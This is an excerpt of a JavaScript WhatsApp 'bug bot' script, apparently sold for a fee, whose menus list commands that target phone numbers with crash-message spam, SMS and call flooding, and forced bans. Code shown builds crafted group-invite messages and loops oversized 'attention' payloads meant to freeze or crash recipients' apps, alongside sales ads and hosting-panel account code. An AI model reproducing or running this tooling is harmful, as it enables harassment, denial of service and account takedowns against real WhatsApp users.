...
𓊈➡︎ Sc ini gw tulis v20 biar kaga ada yang ngembat di panel jika kalian menggunakan panel orang lain

🌷 KALAU MAU RENAME TARO CREDITS GUA : ${botname}*/
//recode : Bii
//recode : Rafathar Offcial
//recode : WannAttackers
//recode : SanzHost 
//================================================//
require('./hwkal')
...
const thumbnail = fs.readFileSync ('./baseikal/image/andioffc.jpg')
const thumb = fs.readFileSync ('./baseikal/image/andioffc.jpg')
const kalimage = fs.readFileSync ('./baseikal/image/andioffc.jpg')
...
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/d7ddc176c26212cda9c7f.jpg',"thumbnail": thumb,"sourceUrl": `https://chat.whatsapp.com/GkHu6Qylzwr7kqQP5F0NbH`}}}, { quoted:m})} 
...
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c811bfd56fafa5997e13f.jpg' }, caption: `*Welcome to ᗯᗩᒍᗩᑕK(♖) Hosting*
*STORE👋 :*

• *FOR YOU🤭*

• _[BOT PANEL]💻> @ KSH 50_
• _[♝ ᗯᗩᒍᗩᑕK(♖)BUG BOT SCRIPT]>🧾 @ KSH 100_
*_wa.me/254102510747🇰🇪 for more info😊_*
*_MPESA :> 254111659469 CHRISS_*

*_ join my WhatsApp group today : https://chat.whatsapp.com/C23E042FC5XDJAMBmxaPDz_*`}, {quoted: m})
}
...
case 'menu': 
case 'wan':
if (!isCreator) return m.reply('*_SORRY😭, 𝗬𝗼𝘂 are NOT ALLOWED 🥺_*')
var sanzytod = [
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n*[■□□□□□□□□□] 𝟷𝟶٪*",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n*[■■■□□□□□□□] 𝟹𝟶٪*",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n*[■■■■■□□□□□] 𝟻𝟶٪*",
...
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n*[■■■■■■■■■■] 𝟷𝟶𝟶٪*",
"ʟᴏᴀᴅɪɴɢ sᴜᴄᴄᴇssғᴜʟ . . .",
`HELLO🤭${pushname} 😱 ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
Here's your balance IDR: ${toRupiah(cekSaldo(sender, db_saldo))}
𝗕𝘂𝗴 𝗕𝗼𝘁 𝗯𝘆 ♝# ᗯᗩᒍᗩᑕKOYᗩ#(♖)⸼
▬▭▬▭▬⫹⫺ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ 
*─[░┋➠ TO PROVIDE ACCESS✅]───╮*
🔸addprem (628xx)
🔸 delprem (628xx)
...
//=================================================//
case 'allbugmenu': 
if (!isCreator) return m.reply('*_𝗢𝗼𝗽𝘀😭, 𝘆𝗼𝘂 are NOT ALOWED🥺_*')
let foottggsnskakzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hello👋 ${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
▬▭▬▭▬⫹⫺ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ 
*─[░┋➠BUG SPAM💡]───╮*
┏━━⊱
...
┣➤ꜱᴇɴᴅᴜɴʟɪʙᴏᴍ (254xxx) 
║➤𝚂𝙴𝙽𝙳𝙸𝙽𝚅𝙸𝚃𝙴𝟹 (254𝚇𝚇𝚇)
║➤ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (254xxx)
║➤ꜱᴇɴᴅᴜɴʟɪᴅᴇʟᴀʏ (254xxx)
║➤𝚂𝙴𝙽𝙳𝙸𝙽𝚅𝙸𝚃𝙴 (254𝚇𝚇𝚇)
║➤𝚂𝙴𝙽𝙳𝙸𝙽𝚅𝙸𝚃𝙴𝟸 (254𝚇𝚇𝚇)
║|||||||||||||||||||•••••••••
╰═══╡✯✯✯✯✯✯✯✯✯╞═══╯
...
await loading()
m.reply(`You again 😭${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
...
if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
await loading()
m.reply(`Murderer🤭 ${pushname} 👋 ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} fbvideo (link)
...
${prefix} ytreels (link)
${prefix} getmusic (reply music)
${prefix} getvideo (reply video)
${prefix} ssweb (link web)`)
}
break
//=================================================//
case 'scmenu': {
if (!isCreator) return m.reply('*_Comrade, Sc is Private_*')
await loading()
m.reply(`Hello Punisher ${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix}ambilsc1
...
if (!isCreator) return m.reply('*_Comrade, Sc is Private_*')
await loading()
m.reply(`Hay bro/sis ${pushname} 👋  ${salam}
...
if (!isCreator) return m.reply('*_Comrade, Sc is Private_*')
await loading()
m.reply(`Welcome🤭 ${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
...
if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
await loading()
m.reply(`Finally😜 ${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} owner
...
if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
await loading()
m.reply(`Salaam aleikhum🙏${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} jadwalsholat
...
if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
await loading()
m.reply(`Unban it 🤭 ${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} spamsms (254xx)
${prefix} call (254xx)
${prefix} kenon (254xx)
${prefix} verif@ (254xx)
${prefix} banned (254xx)
${prefix} createqr
${prefix} unbannedv2 (254xx)
${prefix} unbannedv3 (254xx)
${prefix} unbannedv4 (254xx)
${prefix} unbannedv5 (254xx)`)
}
break
//=================================================//
case 'textmaker':
...
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Make it stylish 🥰${pushname} 👋  ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix}blackpink
...
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Let's have FUN🥇 ${pushname} 👋 Selamat ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
...
Jam : ${time}`
sendGeekzMessage(from, { 
text: `wanna play?🎮 ${pushname} 👋 Selamat ${salam}
Total Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
...
//=================================================/
case "createqr": {
if (!isCreator) return m.reply('*♝# ᗯᗩᒍᗩᑕKOYᗩ#(♖) FOR PRESIDENT*')
await loading()
...
case 'tiktok':
case 'tiktokvideo':{
if (!isCreator) return reply('*♝# ᗯᗩᒍᗩᑕKOYᗩ#(♖) FOR PRESIDENT*')
...
reply(`*━━ CHECK YOUR INFO ━━*
 ...
 _• *Balance:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_
...
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/andioffc.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "status@broadcast",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME ANDI BOTZ${buttonkal}`,
"groupName": `MY NAME ANDI BOTZ${buttonkal}`,
"caption": `${buttonkal}`,
...
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱?? ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒??𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
...
﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌
https://wa.me//6283151983314
( Wa order )

*JOIN JUGA GRUP GW BIAR DAPET PROMO*

https://chat.whatsapp.com/GkHu6Qylzwr7kqQP5F0NbH
...
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/e122428686a2084726814.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
